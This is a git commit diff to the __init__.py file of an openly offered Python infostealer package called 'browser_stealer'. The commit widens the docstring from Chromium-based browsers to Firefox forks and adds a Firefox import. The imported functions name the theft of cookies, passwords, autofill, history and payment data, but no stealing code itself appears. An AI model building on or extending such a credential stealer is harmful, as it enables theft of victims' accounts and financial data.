bf1a2c055b5368deea1e1e82d458e7e41eee73d6
Josakko <112590914+Josakko@users.noreply.github.com>
2023-10-04 21:49:27 +0200

    Update __init__.py

--- browser_stealer/__init__.py
+++ browser_stealer/__init__.py
@@ -2,10 +2,12 @@
 Browser Stealer 
 ~~~~~~~~~~~~~~~
 
-Module for stealing data from chromium based browsers
+Module for stealing data from chromium based and firefox (forks) based browsers 
 
 :copyright: (c) 2023 Josakko
 :license: MIT, see https://github.com/Josakko/browser_stealer/blob/main/LICENSE for more details
 """
 
-from .browser_stealer import Utils, run, opera_gx, opera, chrome, chrome, chromium, edge, brave, fetch_autofill, fetch_bookmarks, fetch_cookies, decrypt_fetch_cookies, fetch_history, fetch_downloads, fetch_passwords, fetch_payment
+from .browser_stealer import Utils, run, opera_gx, opera, chrome, chrome, chromium, edge, brave,   fetch_autofill, fetch_bookmarks, fetch_cookies, decrypt_fetch_cookies, fetch_history, fetch_downloads, fetch_passwords, fetch_payment
+from .firefox import Firefox, FirefoxUtils, FirefoxData, firefox_steal
+
